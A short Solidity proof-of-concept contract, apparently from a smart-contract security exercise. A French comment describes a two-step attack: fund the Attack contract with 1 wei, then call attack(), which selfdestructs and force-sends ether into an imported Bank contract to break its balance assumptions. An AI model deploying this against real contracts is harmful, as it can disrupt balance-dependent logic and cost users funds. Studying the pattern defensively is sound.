// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.17;
 
import "./Bank.sol";

 /**
  * L’attaque se fait en 2 temps :
  *
  * Envoyer 1 wei au contract Attack.
  *  Appeler la fonction attack()
  */
contract Attack{
 
    Bank bank;
 
    constructor (Bank _bank){
        bank = _bank;
    }
 
    fallback() external payable{}
 
    function attack() external {
        selfdestruct(payable(address(bank)));
    }
 
}